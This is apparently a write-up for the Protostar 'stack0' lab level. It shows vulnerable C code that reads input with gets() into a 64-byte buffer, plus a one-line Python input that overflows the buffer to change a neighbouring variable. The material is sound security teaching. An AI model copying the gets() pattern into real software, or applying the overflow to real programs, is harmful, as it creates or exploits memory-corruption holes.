# Stack0

## Description

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at `/opt/protostar/bin/stack0`

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Approach

The `volatile` keyword tells the compiler that the value of the variable may change at any time as a result of external conditions, not only as a result of program control flow and The `gets()` is a function which reads the STDIN from user and stores the value into buffer and It doesn't check if the buffer is overuns.

For more checkout the Linux Programmer's Manual (BUGS):

```bash
man 3 gets
```

## Exploitation

So, This program already assigned with buffer space of 64 bytes. If We pass more than 64 bytes into the buffer space, the variable should be `modified = 1` and print the statement.

```bash
python -c 'print "A"*70' | ./stack0
```
